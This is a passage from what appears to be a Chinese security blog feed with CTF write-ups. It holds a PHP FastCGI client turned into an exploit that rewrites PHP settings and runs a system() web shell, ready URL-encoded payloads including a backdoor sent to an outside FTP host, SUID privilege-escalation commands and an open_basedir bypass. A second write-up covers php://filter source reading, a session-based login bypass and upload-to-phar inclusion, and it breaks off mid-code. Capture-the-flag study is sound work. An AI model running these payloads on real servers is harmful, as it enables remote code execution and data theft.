class="variable">$ret</span>[<span class="string">&#x27;type&#x27;</span>]          = ord(<span class="variable">$data</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;requestId&#x27;</span>]     = (ord(<span class="variable">$data</span>&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;contentLength&#x27;</span>] = (ord(<span class="variable">$data</span>&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;paddingLength&#x27;</span>] = ord(<span class="variable">$data</span>&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;reserved&#x27;</span>]      = ord(<span class="variable">$data</span>&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$packet</span> = fread(<span class="keyword">$this</span>-&gt;_sock, <span class="built_in">self</span>::HEADER_LEN)) &#123;</span><br><span class="line">            <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;decodePacketHeader(<span class="variable">$packet</span>);</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$len</span>  = <span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$len</span> &amp;&amp; <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$len</span>)) &#123;</span><br><span class="line">                    <span class="variable">$len</span> -= strlen(<span class="variable">$buf</span>);</span><br><span class="line">                    <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] .= <span class="variable">$buf</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$requestedInfo</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">        <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$requestedInfo</span> <span class="keyword">as</span> <span class="variable">$info</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$info</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;_sock, <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::GET_VALUES, <span class="variable">$request</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;readPacket();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::GET_VALUES_RESULT) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;readNvpair(<span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>], <span class="variable">$resp</span>[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        <span class="variable">$request</span> = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>) <span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$paramsRequest</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paramsRequest</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stdin</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="variable">$stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;data=&#x27;</span>.urlencode(<span class="variable">$request</span>));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;</span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filepath</span>);</span><br><span class="line"><span class="variable">$uri</span> = <span class="variable">$req</span> .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>; <span class="comment">// php payload -- Doesnt do anything</span></span><br><span class="line"><span class="variable">$php_value</span> = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = evil.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;</span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="variable">$req</span>,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="variable">$php_value</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; strlen(<span class="variable">$code</span>)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;request(<span class="variable">$params</span>, <span class="variable">$code</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;payload</span><br><span class="line">data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3C%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B0PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+evil.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9000%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;payload</span><br><span class="line">backdoor&#x3D;$file &#x3D; $_GET[&#39;file&#39;];$data &#x3D; $_GET[&#39;data&#39;];file_put_contents($file,$data);&amp;file&#x3D;ftp:&#x2F;&#x2F;aaa@vps:port&#x2F;123&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3C%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B0PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+evil.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9000%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></pre></td></tr></table></figure><p>之后就反弹回来shell：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210503144600577.png" alt="image-20210503144600577"></p><p>但是不能<code>cat /flag</code>，接下来提权。</p><h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看具有root权限的SUID文件：</span><br><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br><span class="line">或者sudo -l 命令列出当前用户可执行的命令</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210503150346482.png" alt="image-20210503150346482"></p><p>可以利用php进行读取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#39;&#x2F;tmp&#39;);mkdir(&#39;vvv&#39;);chdir(&#39;vvv&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(ini_get(&#39;open_basedir&#39;));echo file_get_contents(&#39;&#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210503151905632.png" alt="image-20210503151905632"></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">蓝帽杯_one_Pointer_php</a></p><p><a href="https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/">hxp CTF resonator Writeup - SSRF via file_put_contents</a></p><p><a href="https://guokeya.github.io/post/gS01eEZwU/">HXP resonator(利用file_put_contents打SSRF)</a></p><p><a href="https://www.anquanke.com/post/id/186186">从一道CTF学习Fastcgi绕过姿势</a></p><p><a href="https://xz.aliyun.com/t/5598">浅析php-fpm的攻击方式</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-2020极客大挑战</title>
      <link href="2021/04/21/BUUCTF-2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
      <url>2021/04/21/BUUCTF-2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="BUUCTF-2020极客大挑战"><a href="#BUUCTF-2020极客大挑战" class="headerlink" title="BUUCTF-2020极客大挑战"></a>BUUCTF-2020极客大挑战</h2><h3 id="WEB-Welcome"><a href="#WEB-Welcome" class="headerlink" title="[WEB]Welcome"></a>[WEB]Welcome</h3><p>题目访问不了，bp抓包，响应头显示：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420165004.png" alt="image-20210420165004101"></p><p>改为post请求：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420165110.png" alt="image-20210420165110191"></p><p>数组绕过sha1：<code>roam1[]=1&amp;roam2[]=2</code></p><p>phpinfo()页面搜索flag：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420165752.png" alt="image-20210420165752409"></p><h3 id="WEB-myblog"><a href="#WEB-myblog" class="headerlink" title="[WEB]myblog"></a>[WEB]myblog</h3><p>打开题目看到url，猜测存在伪协议读取文件，没有读到index 读到了login.php：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;login</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420170555.png" alt="image-20210420170555560"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//secret.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret_seed</span> = mt_rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line">mt_srand(<span class="variable">$secret_seed</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = mt_rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到传入的username&amp;password进入了<code>/?page=admin/user</code>，读取一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$logined</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&quot;Longlone&quot;</span> <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;  <span class="comment">// No one knows my password, including myself</span></span><br><span class="line"><span class="variable">$logined</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] = <span class="variable">$logined</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$logined</span> === <span class="literal">false</span> &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] !== <span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过关键代码可知用户名为<code>Longlone</code>，密码为随机数验证通过会进入admin目录，可见在验证密码的时候采用<code>==</code> ，我们可以通过清空session 然后密码为空绕过：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420185859.png" alt="image-20210420185859172"></p><p>成功登陆。</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420190000.png" alt="image-20210420190000711"></p><p>接下来审计读到的其他代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] === <span class="literal">true</span>)&#123;</span><br><span class="line"><span class="variable">$tmp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$tmp_path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$extension</span> = pathinfo(<span class="variable">$tmp_file</span>)[<span class="string">&#x27;extension&#x27;</span>]) != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="variable">$allows</span> = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$extension</span>,<span class="variable">$allows</span>,<span class="literal">true</span>) <span class="keyword">and</span> in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],array_map(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$ext</span></span>)</span>&#123;<span class="keyword">return</span> <span class="string">&#x27;image/&#x27;</span>.<span class="variable">$ext</span>;&#125;,<span class="variable">$allows</span>),<span class="literal">true</span>))&#123;</span><br><span class="line"><span class="variable">$upload_name</span> = sha1(md5(uniqid(microtime(<span class="literal">true</span>), <span class="literal">true</span>))).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">move_uploaded_file(<span class="variable">$tmp_path</span>,<span class="string">&quot;assets/img/upload/&quot;</span>.<span class="variable">$upload_name</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到存在这么一段代码，文件上传，采用的是白名单，想到首页的文件包含，我们可以文件包含配合上传图片getshell，但是通过我们伪协议读取源码得知包含的时候会加上<code>.php</code>后缀，因此通过<code>zip://</code> 或者<code>phar://</code>协议来包含。利用过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 